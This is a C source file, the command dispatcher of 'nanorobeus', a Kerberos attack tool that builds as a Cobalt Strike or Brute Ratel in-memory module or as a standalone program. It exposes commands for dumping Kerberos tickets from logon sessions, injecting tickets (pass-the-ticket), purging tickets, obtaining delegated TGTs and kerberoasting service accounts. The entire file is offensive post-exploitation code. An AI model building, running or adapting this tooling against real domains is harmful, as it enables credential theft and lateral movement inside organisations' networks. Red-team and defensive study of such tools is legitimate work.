#include <windows.h>
#include <stdio.h>
#include "beacon.h"
#include "bofdefs.h"

#if defined(BOF) || defined(BRC4)
#include "common.c"
#include "luid.c"
#include "sessions.c"
#include "purge.c"
#include "klist.c"
#include "base64.c"
#include "ptt.c"
#include "krb5.c"
#include "tgtdeleg.c"
#include "kerberoast.c"
#else
#include "common.h"
#include "luid.h"
#include "sessions.h"
#include "purge.h"
#include "klist.h"
#include "base64.h"
#include "ptt.h"
#include "krb5.h"
#include "tgtdeleg.h"
#include "kerberoast.h"
#endif

void execute(WCHAR** dispatch, char* command, char* arg1, char* arg2, char* arg3, char* arg4);

#ifdef BOF

void go(char* args, int length) {
    datap parser;
    BeaconDataParse(&parser, args, length);
    char* command = BeaconDataExtract(&parser, NULL);
    if (command == NULL) {
        command = "";
    }
    char* arg1 = BeaconDataExtract(&parser, NULL);
    if (arg1 == NULL) {
        arg1 = "";
    }
    char* arg2 = BeaconDataExtract(&parser, NULL);
    if (arg2 == NULL) {
        arg2 = "";
    }
    char* arg3 = BeaconDataExtract(&parser, NULL);
    if (arg3 == NULL) {
        arg3 = "";
    }
    char* arg4 = BeaconDataExtract(&parser, NULL);
    if (arg4 == NULL) {
        arg4 = "";
    }
    execute(NULL, command, arg1, arg2, arg3, arg4);
}

#elif BRC4

void coffee(char** argv, int argc, WCHAR** dispatch) {
    char *command = "", *arg1 = "", *arg2 = "", *arg3 = "", *arg4 = "";
    if (argc >= 1) {
        command = argv[0];
    }
    if (argc >= 2) {
        arg1 = argv[1];
    }
    if (argc >= 3) {
        arg2 = argv[2];
    }
    if (argc >= 4) {
        arg3 = argv[3];
    }
    if (argc >= 5) {
        arg4 = argv[4];
    }
    execute(dispatch, command, arg1, arg2, arg3, arg4);
}

#else

int main(int argc, char* argv[]) {
    char *command = "", *arg1 = "", *arg2 = "", *arg3 = "", *arg4 = "";
    if (argc >= 2) {
        command = argv[1];
    }
    if (argc >= 3) {
        arg1 = argv[2];
    }
    if (argc >= 4) {
        arg2 = argv[3];
    }
    if (argc >= 5) {
        arg3 = argv[4];
    }
    if (argc >= 6) {
        arg4 = argv[5];
    }
    execute(NULL, command, arg1, arg2, arg3, arg4);
    return 0;
}

#endif

void execute(WCHAR** dispatch, char* command, char* arg1, char* arg2, char* arg3, char* arg4) {
    if (_strcmp(command, "") == 0) {
        PRINT(dispatch, "[!] Specify command.\n");
        return;
    }

    LUID luid = (LUID){.HighPart = 0, .LowPart = 0};
    BOOL currentLuid = FALSE;

    if (_strcmp(command, "luid") == 0) {
        execute_luid(dispatch);
    } else if ((_strcmp(command, "sessions") == 0) || (_strcmp(command, "klist") == 0) ||
               (_strcmp(command, "dump") == 0)) {
        if (_strcmp(arg1, "") != 0) {
            if (_strcmp(arg1, "/luid") == 0) {
                if (_strcmp(arg2, "") != 0) {
                    luid.LowPart = MSVCRT$strtol(arg2, NULL, 16);
                    if (luid.LowPart == 0 || luid.LowPart == LONG_MAX || luid.LowPart == LONG_MIN) {
                        PRINT(dispatch, "[!] Specify valid /luid\n");
                        return;
                    }
                } else {
                    PRINT(dispatch, "[!] Specify /luid argument\n");
                    return;
                }
            } else if (_strcmp(arg1, "/all") == 0) {
                luid = (LUID){.HighPart = 0, .LowPart = 0};
            } else {
                PRINT(dispatch, "[!] Unknown command\n");
                return;
            }
        } else {
            LUID* cLuid = GetCurrentLUID();
            if (cLuid == NULL) {
                PRINT(dispatch, "[!] Unable to get current session LUID: %ld\n", KERNEL32$GetLastError());
                return;
            }
            luid.HighPart = cLuid->HighPart;
            luid.LowPart = cLuid->LowPart;
            currentLuid = TRUE;
            MSVCRT$free(cLuid);
        }

        if (_strcmp(command, "sessions") == 0) {
            execute_sessions(dispatch, luid, currentLuid);
        } else if (_strcmp(command, "klist") == 0) {
            execute_klist(dispatch, luid, currentLuid, FALSE);
        } else {
            execute_klist(dispatch, luid, currentLuid, TRUE);
        }
    } else if (_strcmp(command, "ptt") == 0) {
        char* ticket;
        if (_strcmp(arg1, "") != 0) {
            ticket = arg1;
            if (_strcmp(arg2, "") != 0) {
                if (_strcmp(arg2, "/luid") == 0) {
                    if (_strcmp(arg3, "") != 0) {
                        luid.LowPart = MSVCRT$strtol(arg3, NULL, 16);
                        if (luid.LowPart == 0 || luid.LowPart == LONG_MAX || luid.LowPart == LONG_MIN) {
                            PRINT(dispatch, "[!] Specify valid /luid\n");
                            return;
                        }
                    }
                }
            } else {
                LUID* cLuid = GetCurrentLUID();
                if (cLuid == NULL) {
                    PRINT(dispatch, "[!] Unable to get current session LUID: %ld\n", KERNEL32$GetLastError());
                    return;
                }
                luid.HighPart = cLuid->HighPart;
                luid.LowPart = cLuid->LowPart;
                currentLuid = TRUE;
                MSVCRT$free(cLuid);
            }
            execute_ptt(dispatch, ticket, luid, currentLuid);
        } else {
            PRINT(dispatch, "[!] Specify Base64 encoded ticket\n");
            return;
        }
    } else if (_strcmp(command, "purge") == 0) {
        if (_strcmp(arg1, "") != 0) {
            if (_strcmp(arg1, "/luid") == 0) {
                if (_strcmp(arg2, "") != 0) {
                    luid.LowPart = MSVCRT$strtol(arg2, NULL, 16);
                    if (luid.LowPart == 0 || luid.LowPart == LONG_MAX || luid.LowPart == LONG_MIN) {
                        PRINT(dispatch, "[!] Specify valid /luid\n");
                        return;
                    }
                } else {
                    PRINT(dispatch, "[!] Specify /luid argument\n");
                    return;
                }
            } else {
                PRINT(dispatch, "[!] Unknown command\n");
                return;
            }
        } else {
            LUID* cLuid = GetCurrentLUID();
            if (cLuid == NULL) {
                PRINT(dispatch, "[!] Unable to get current session LUID: %ld\n", KERNEL32$GetLastError());
                return;
            }
            luid.HighPart = cLuid->HighPart;
            luid.LowPart = cLuid->LowPart;
            currentLuid = TRUE;
            MSVCRT$free(cLuid);
        }
        execute_purge(dispatch, luid, currentLuid);
    } else if (_strcmp(command, "tgtdeleg") == 0) {
        char* spn = NULL;
        if (_strcmp(arg1, "") != 0) {
            spn = arg1;
        } else {
            PRINT(dispatch, "[!] Specify SPN\n");
            return;
        }
        execute_tgtdeleg(dispatch, spn);
    } else if (_strcmp(command, "kerberoast") == 0) {
        char* spn = NULL;
        if (_strcmp(arg1, "") != 0) {
            spn = arg1;
        } else {
            PRINT(dispatch, "[!] Specify SPN\n");
            return;
        }
        execute_kerberoast(dispatch, spn);
    } else if (_strcmp(command, "help") == 0) {
        PRINT(dispatch, "[*] nanorobeus 0.0.4\n[*] Command list:\n");
        PRINT(dispatch, "\tluid\n");
        PRINT(dispatch, "\tsessions [/luid <0x0> | /all]\n");
        PRINT(dispatch, "\tklist    [/luid <0x0> | /all]\n");
        PRINT(dispatch, "\tdump     [/luid <0x0> | /all]\n");
        PRINT(dispatch, "\tptt      <BASE64> [/luid <0x0>]\n");
        PRINT(dispatch, "\tpurge    [/luid <0x0>]\n");
        PRINT(dispatch, "\ttgtdeleg <SPN>\n");
        PRINT(dispatch, "\tkerberoast <SPN>\n");
    } else {
        PRINT(dispatch, "[!] Unknown command.\n");
    }
}
